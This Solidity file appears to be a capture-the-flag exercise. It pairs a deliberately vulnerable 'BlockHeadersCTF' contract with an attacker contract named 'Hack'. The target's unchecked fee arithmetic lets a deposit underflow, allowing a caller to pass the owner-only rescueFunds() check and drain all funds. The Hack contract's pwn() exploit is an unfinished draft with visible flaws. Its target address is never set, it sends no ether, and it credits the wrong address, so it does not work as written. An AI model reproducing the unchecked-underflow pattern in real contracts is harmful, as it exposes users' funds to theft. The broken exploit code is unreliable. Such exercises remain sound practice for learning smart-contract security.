// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

contract Hack {
   BlockHeadersCTF public blockHeadersCTF;
   address hackerAddr;
    mapping(address => uint256) deposits;
   uint256 constant BASIS_POINTS = 1e4;
    uint256 public feeBps = 3141;
    uint256 donationBps = 1 ether;

    // uint256 amount = (donationBps * (feeBps + ))

                // return (amount * (feeBps + bonusBps)) / BASIS_POINTS;

   constructor (BlockHeadersCTF  _blockHeadersCTF) payable {
        hackerAddr = msg.sender;


   }



   function pwn() external {
        blockHeadersCTF.deposit(hackerAddr, donationBps);

        blockHeadersCTF.rescueFunds();
   }

   receive() external payable {
      
    }
}

contract BlockHeadersCTF {
    address owner;
    mapping(address => uint256) deposits;

    uint256 constant BASIS_POINTS = 1e4;
    uint256 public feeBps = 3141;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor() payable {
        owner = msg.sender;
        deposits[owner] = type(uint256).max; // mark the original owner
    }

    function deposit(address receiver, uint256 donationBps) external payable {
        uint256 value;
        uint256 fee = _calculateFee(msg.value, donationBps);

        unchecked {
            value = msg.value - fee;
        }

        deposits[receiver] += value;
    }

    function withdraw() external {
        uint256 amount = deposits[msg.sender];
        deposits[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
    }

    function setFee(uint256 _feeBps) external onlyOwner {
        feeBps = _feeBps;
    }

    function rescueFunds() external {
        require(deposits[msg.sender] == type(uint256).max); // only original owner can rescue
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success);
    }

    function transferOwnership(address newOwner) external onlyOwner {
        owner = newOwner;
    }

    function viewDeposit(address account) external view returns(uint256){
        return deposits[account];
    }

    function _calculateFee(uint256 amount, uint256 bonusBps)
        internal
        view
        returns (uint256)
    {
        unchecked {
            return (amount * (feeBps + bonusBps)) / BASIS_POINTS;
        }
    }


    receive() external payable {}

    fallback() external payable {}

}